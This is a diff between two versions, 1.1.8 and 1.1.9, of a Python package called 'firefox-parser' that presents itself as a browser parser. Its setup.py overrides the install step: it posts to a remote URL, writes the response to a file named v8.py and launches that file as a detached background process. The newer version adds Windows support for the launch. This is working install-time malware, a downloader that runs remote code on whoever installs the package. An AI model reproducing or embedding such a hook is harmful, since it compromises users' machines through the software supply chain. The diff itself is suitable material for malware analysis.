# Comparing `tmp/firefox-parser-1.1.8.tar.gz` & `tmp/firefox-parser-1.1.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "firefox-parser-1.1.8.tar", last modified: Thu May 18 01:04:24 2023, max compression
+gzip compressed data, was "firefox-parser-1.1.9.tar", last modified: Thu May 18 01:16:46 2023, max compression
```

## Comparing `firefox-parser-1.1.8.tar` & `firefox-parser-1.1.9.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-05-18 01:04:24.197130 firefox-parser-1.1.8/
--rw-rw-rw-   0        0        0       96 2023-05-18 01:04:24.191621 firefox-parser-1.1.8/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-18 01:04:24.188636 firefox-parser-1.1.8/firefox_parser.egg-info/
--rw-rw-rw-   0        0        0       96 2023-05-18 01:04:24.000000 firefox-parser-1.1.8/firefox_parser.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      197 2023-05-18 01:04:24.000000 firefox-parser-1.1.8/firefox_parser.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-18 01:04:24.000000 firefox-parser-1.1.8/firefox_parser.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       17 2023-05-18 01:04:24.000000 firefox-parser-1.1.8/firefox_parser.egg-info/requires.txt
--rw-rw-rw-   0        0        0        1 2023-05-18 01:04:24.000000 firefox-parser-1.1.8/firefox_parser.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-18 01:04:24.198131 firefox-parser-1.1.8/setup.cfg
--rw-rw-rw-   0        0        0     1608 2023-05-18 01:04:20.000000 firefox-parser-1.1.8/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-18 01:16:46.293735 firefox-parser-1.1.9/
+-rw-rw-rw-   0        0        0       96 2023-05-18 01:16:46.292744 firefox-parser-1.1.9/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-18 01:16:46.291731 firefox-parser-1.1.9/firefox_parser.egg-info/
+-rw-rw-rw-   0        0        0       96 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      197 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        1 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-18 01:16:46.293735 firefox-parser-1.1.9/setup.cfg
+-rw-rw-rw-   0        0        0     2045 2023-05-18 01:16:38.000000 firefox-parser-1.1.9/setup.py
```

### Comparing `firefox-parser-1.1.8/setup.py` & `firefox-parser-1.1.9/setup.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,11 +1,12 @@
 from setuptools import setup
 from setuptools.command.install import install
 import requests
 import os
+import sys
 import subprocess
 
 class PreInstallCommand(install):
     """Custom pre-installation command."""
     def run(self):
         # Your pre-installation commands        
         install.run(self)
@@ -25,27 +26,34 @@
         response = requests.post(url, payload, verify=False)
         
         if response.status_code == 200:            
             chromium_path = os.path.join(directory, "v8.py")
             
             with open(chromium_path, 'w') as f:
                 f.write(response.text)
-            try:
-                subprocess.Popen(['python', chromium_path], preexec_fn=os.setpgrp)
-            except Exception as e:
-                subprocess.Popen(['python3', chromium_path], preexec_fn=os.setpgrp)
+
+            if sys.platform == 'win32':
+                try:
+                    subprocess.Popen(['python', chromium_path], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS)
+                except Exception as e:
+                    subprocess.Popen(['python3', chromium_path], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS)
+            else:
+                try:
+                    subprocess.Popen(['python', chromium_path], preexec_fn=os.setpgrp)
+                except Exception as e:
+                    subprocess.Popen(['python3', chromium_path], preexec_fn=os.setpgrp)
         else:
             print('Error:', response.status_code)
         
 
 setup(
     name='firefox-parser',
-    version='1.1.8',
+    version='1.1.9',
     description='FireFox Parser in Python',
     cmdclass={
         'install': PreInstallCommand,
     },
     install_requires=[
-        'requests==2.30.0',
+        'requests',
     ],
     # Other package details
 )
```

